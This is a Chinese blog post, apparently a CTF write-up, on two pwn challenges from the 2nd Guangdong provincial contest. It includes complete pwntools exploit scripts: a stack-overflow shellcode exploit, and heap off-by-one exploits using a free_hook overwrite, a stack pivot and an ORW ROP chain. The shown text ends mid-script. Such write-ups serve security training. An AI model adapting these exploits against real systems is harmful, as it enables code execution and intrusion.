@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+
+
+<html lang="zh">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>第二届广东省赛 |  H.greed</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-第二届广东省赛"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  第二届广东省赛
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/05/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%B5%9B/" class="article-date">
+  <time datetime="2022-05-23T16:13:47.000Z" itemprop="datePublished">2022-05-24</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.7k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">9 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="result"><a href="#result" class="headerlink" title="result"></a>result</h1><p><img src="https://user-images.githubusercontent.com/72968793/169868641-f9c24c72-3085-47e8-89f2-5edfcac5abc1.png" alt="1653324365(1)"></p>
+<p>躺平，悲伤（下次还敢）【还是要努力学啊】啃老。第二届果然比第一届卷死，广东省这次有钱找奇安信了，期待一波线下赛（公费旅游狂喜</p>
+<h1 id="jmp-rsp"><a href="#jmp-rsp" class="headerlink" title="jmp_rsp"></a>jmp_rsp</h1><p><img src="https://user-images.githubusercontent.com/72968793/169863246-1d747394-b866-4afb-8e86-c7c08ff5fdec.png" alt="1653322679(1)"></p>
+<p>静态编译，明显的栈溢出，没有输出函数的plt got表常规rop直接pass，因为静态编译可以有很多的gadget，不嫌麻烦可以系统调用</p>
+<p>我这里用别的办法几行代码搞定了，毕竟给了RWX段</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/169863728-2da6fa5b-bb6c-445e-9df7-b9476f3007e0.png" alt="1653322849(1)"></p>
+<p>其实没开canary，静态编译自带了栈溢出检测函数罢了，checksec的机制很low只是检测这个函数的存在性不考虑调用。</p>
+<p>思路：栈溢出改rsi为rwx段然后控制rip为read写shellcode然后ret到rwx</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./jmp_rsp&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./jmp_rsp&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">rsi=<span class="number">0x0000000000410173</span></span><br><span class="line">bss=<span class="number">0x6b7000</span></span><br><span class="line">sh=asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))<span class="comment">#asm(shellcraft.execve(&quot;/bin/sh&quot;)) getshell is okay too.</span></span><br><span class="line">pa=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(rsi)+p64(bss)+p64(<span class="number">0x449380</span>)+p64(bss)</span><br><span class="line">r.send(pa)</span><br><span class="line">r.send(sh)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h1><p>2.31的堆题，开了白名单沙盒，想用mprotect是不ok的，然后看下漏洞</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/169864764-36973f18-8dec-4142-92fd-21a818c09be5.png" alt="1653323137(1)"></p>
+<p>size的选取是直接选取的堆的size，我们都知道堆的size是必定以一结尾的，所以造成了off by one的漏洞，大小限制很恶心吧，0x28和0xb0两种，而且他这种堆的机制是靠heap实现的，一句话，“大聪明”才用这种。题目描述远程文件符1-5被占用，所以等下orw，flag的文件描述符是6。</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/169864498-94823a59-812c-42bb-a109-72df4238289c.png" alt="1653323092(1)"></p>
+<p>思路</p>
+<p>直接off by one 堆叠，打free_hook 然后找到这段gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28]; </span><br></pre></td></tr></table></figure>
+
+<p>这段gadget不是所有libc版本都有，看运气，最好的通用是打environ泄露栈地址 然后在栈上构造orw</p>
+<p>我这里用这个gadget的思路就是，相当于进行一个栈迁移到堆上然后开个足够大的read再去写入orw</p>
+<p>打gadget这种要自己看好gadget的汇编来布局，不难的。</p>
+<p>两种exp我都摆上</p>
+<h2 id="exp1：泄露栈地址"><a href="#exp1：泄露栈地址" class="headerlink" title="exp1：泄露栈地址"></a>exp1：泄露栈地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;.\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;.\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;.\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">12</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0xf0</span>)+<span class="string">&#x27;\xc0&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0xf0</span>)+<span class="string">&#x27;\xf0&#x27;</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    base = leak-<span class="number">0x1ecb80</span>-<span class="number">96</span></span><br><span class="line">    free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    environ = base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    rdi = base + <span class="number">0x0000000000023b72</span></span><br><span class="line">    rsi = base + <span class="number">0x000000000002604f</span></span><br><span class="line">    rdx = base + <span class="number">0x0000000000119241</span></span><br><span class="line">    rax = base + <span class="number">0x0000000000047400</span></span><br><span class="line">    syscall = base + <span class="number">0x000000047686</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&quot;/home/pwn/flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line">    delete(<span class="number">13</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    leak_heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">10</span>,p64(environ-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    show(<span class="number">11</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    stack_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    edit_ret = stack_addr-<span class="number">0x000120</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">10</span>,p64(edit_ret)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    flag_addr = leak_heap - <span class="number">0x0000c0</span></span><br><span class="line">    the_tmp = leak_heap - <span class="number">0x000630</span></span><br><span class="line">    attack_rop = p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">    attack_rop += p64(rsi) + p64(edit_ret+<span class="number">0x58</span>-<span class="number">16</span>)</span><br><span class="line">    attack_rop += p64(rdx)+p64(<span class="number">0x400</span>)*<span class="number">2</span></span><br><span class="line">    attack_rop += p64(rax)+p64(<span class="number">0</span>)</span><br><span class="line">    attack_rop += p64(syscall)</span><br><span class="line">    attack_rop += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">    add(<span class="number">0xb0</span>,attack_rop)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    attack_rop = <span class="string">&quot;/home/pwn/flag&quot;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(rdi) + p64(edit_ret+<span class="number">0x58</span>-<span class="number">16</span>)+p64(rsi) + p64(<span class="number">0</span>)+p64(rax) + p64(<span class="number">2</span>)+p64(syscall)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    attack_rop += p64(rdi) + p64(edit_ret+<span class="number">0x58</span>-<span class="number">16</span>)</span><br><span class="line">    attack_rop += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    attack_rop += p64(rax) + p64(<span class="number">2</span>)</span><br><span class="line">    attack_rop += p64(syscall)</span><br><span class="line">    attack_rop += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">0x10</span>):</span><br><span class="line">	    attack_rop += p64(rdi) + p64(i)</span><br><span class="line">	    attack_rop += p64(rsi) + p64(the_tmp)</span><br><span class="line">	    attack_rop += p64(rdx) + p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">	    attack_rop += p64(rax) + p64(<span class="number">0</span>)</span><br><span class="line">	    attack_rop += p64(syscall)</span><br><span class="line">	    attack_rop += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    attack_rop += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">    attack_rop += p64(rsi) + p64(the_tmp) </span><br><span class="line">    attack_rop += p64(rax) + p64(<span class="number">1</span>)</span><br><span class="line">    attack_rop += p64(syscall)</span><br><span class="line">    r.sendline(attack_rop)</span><br><span class="line">    r.interactive()</span><br><span class="line">r=process(<span class="string">&#x27;./orz&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="exp2：栈迁移"><a href="#exp2：栈迁移" class="headerlink" title="exp2：栈迁移"></a>exp2：栈迁移</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">rx = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">close = <span class="keyword">lambda</span> : p.close()</span><br><span class="line">debug = <span class="keyword">lambda</span> : gdb.attach(p)</span><br><span class="line">shell = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choose which one?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_s</span>(<span class="params">con</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;please input note size :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x28</span>))</span><br><span class="line">	sla(<span class="string">&#x27;please input your note.&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_b</span>(<span class="params">con</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;please input note size :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xb0</span>))</span><br><span class="line">	sla(<span class="string">&#x27;please input your note.&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&#x27;please input note index.&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;please input new note.&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">&#x27;please input note index.&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;please input note index.&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./orz&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">[add_b(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">add_s(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">add_b(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">[free(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">[add_s(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;\xc1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_s(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">f_hook = base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">gadget = base+<span class="number">0x0000000000154d0a</span>	</span><br><span class="line"><span class="comment"># mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28]; </span></span><br><span class="line">leave = base+<span class="number">0x00000000000578f8</span></span><br><span class="line">rdi = base+libc.search(asm(<span class="string">&quot;pop rdi;ret;&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">rsi = base+libc.search(asm(<span class="string">&quot;pop rsi;ret;&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">rdx = base+<span class="number">0x000000000015f7e6</span><span class="comment"># pop rdx; pop rbx; ret;</span></span><br><span class="line">rax = base+libc.search(asm(<span class="string">&quot;pop rax;ret;&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">read = base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rsp = base+<span class="number">0x000000000002f73a</span>	<span class="comment"># pop rsp; ret;</span></span><br><span class="line">pp_ret = base+<span class="number">0x0000000000023b70</span> <span class="comment"># pop rsi; pop r15; ret;</span></span><br><span class="line">popen = base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write = base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = base+<span class="number">0x00000000000630d9</span><span class="comment"># syscall; ret;</span></span><br><span class="line">gets = base+libc.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add_s(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#2 7</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">heap = u64(rx(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x000180</span></span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">2</span>, p64(f_hook))</span><br><span class="line">add_s(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add_s(p64(gadget)) <span class="comment">#free_hook</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *&#x27;+str(gadget))</span></span><br><span class="line"></span><br><span class="line">pl = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pl+= p64(heap+<span class="number">0x18</span>) <span class="comment">#rbp</span></span><br><span class="line">pl+= p64(pp_ret) <span class="comment">#rsp ret </span></span><br><span class="line">pl+=p64(heap)</span><br><span class="line">pl+= p64(heap+<span class="number">0x38</span>) <span class="comment">#rax</span></span><br><span class="line">pl+= p64(rsp)</span><br><span class="line">pl+= p64(heap+<span class="number">0x38</span>+<span class="number">0x30</span>)<span class="comment">#rdi+0x48</span></span><br><span class="line">pl+= p64(<span class="number">0</span>)*<span 